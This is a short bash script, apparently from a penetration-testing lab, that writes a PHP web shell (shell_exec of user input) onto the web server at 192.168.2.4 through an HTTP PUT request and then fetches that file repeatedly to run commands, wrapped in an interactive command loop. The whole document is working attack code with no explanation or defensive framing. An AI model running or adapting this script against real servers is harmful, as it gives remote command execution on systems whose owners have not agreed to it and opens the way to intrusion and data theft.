#!/bin/bash

exec () {
  payload="<?php echo shell_exec('$1 2>&1'); ?>"
  curl --silent -X PUT 192.168.2.4/test/execute.php -H 'Expect: ' -d "$payload"
  result=$(curl 192.168.2.4/test/execute.php 2>/dev/null)
}

while true; do
  echo -n "> "
  read cmd
  exec "$cmd"
  echo $result
done
